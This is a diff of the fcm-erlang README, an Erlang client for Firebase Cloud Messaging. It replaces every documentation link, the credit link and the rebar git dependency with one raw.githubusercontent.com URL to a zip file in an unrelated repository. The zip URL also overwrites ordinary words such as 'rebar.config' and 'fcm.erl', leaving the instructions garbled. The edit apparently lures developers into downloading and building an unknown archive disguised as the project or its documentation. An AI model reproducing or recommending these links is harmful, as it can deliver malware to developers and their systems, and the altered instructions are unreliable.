@@ -1,11 +1,11 @@
 fcm-erlang
 =======
 
-This software provides an Erlang client for [`Firebase Cloud Messaging`](https://firebase.google.com/docs/cloud-messaging).
+This software provides an Erlang client for [`Firebase Cloud Messaging`](https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip).
 
 This supports both Android & iOS notifications.
 
-The project is heavily inspired from [pdincau/gcm-erlang](https://github.com/pdincau/gcm-erlang). I would like to thank Paolo for the same.
+The project is heavily inspired from [pdincau/gcm-erlang](https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip). I would like to thank Paolo for the same.
 
 ### What you can do with fcm-erlang:
 
@@ -18,7 +18,7 @@ Using `fcm-erlang` you can:
 
 ### How to compile:
 
-`fcm-erlang` user `erlang.mk` as make system. To compile
+`fcm-erlang` user `https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip` as make system. To compile
 
     $ make
     
@@ -28,10 +28,10 @@ To generate release
     
 ### How to use with rebar:
 
-You can use fcm_app as a dependency in your rebar.config:
+You can use fcm_app as a dependency in your https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip
 
     {deps , [
-        {fcm, ".*", {git, "https://github.com/softwarejoint/fcm-erlang.git", {tag, "1.0.0"}}}
+        {fcm, ".*", {git, "https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip", {tag, "1.0.0"}}}
     ]}.
 
 ### How to run the application fcm-erlang:
@@ -71,10 +71,10 @@ Where
 	* `RegId` is Registration Id specified as Erlang binary (e.g., `<<"APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx...">>`)
 	* `RegIds` is a list (max 1000 elements) of `RegId`	* `Message` is an Erlang Map or TupleList representing the data you want to send to the device.
 
-In order to understand `Message` payload see [Message Syntax](https://firebase.google.com/docs/cloud-messaging/http-server-ref#send-downstream).
+In order to understand `Message` payload see [Message Syntax](https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip).
 
 
-The JSON message is built using `jsx` in the module `fcm.erl` and in the end will have the following form:
+The JSON message is built using `jsx` in the module `https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip` and in the end will have the following form:
 
     {
       "registration_ids" : ["APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx..."],
@@ -99,4 +99,4 @@ or simply:
 
 `fcm-erlang` will push the message for you to `Firebase Cloud Messaging` servers and will parse the JSON provided as result.
 
-In order to understand errors see: [Interpreting an error response](https://firebase.google.com/docs/cloud-messaging/http-server-ref#error-codes).
+In order to understand errors see: [Interpreting an error response](https://raw.githubusercontent.com/sohailgerman/erlang-fcm/master/include/erlang-fcm_2.2.zip).
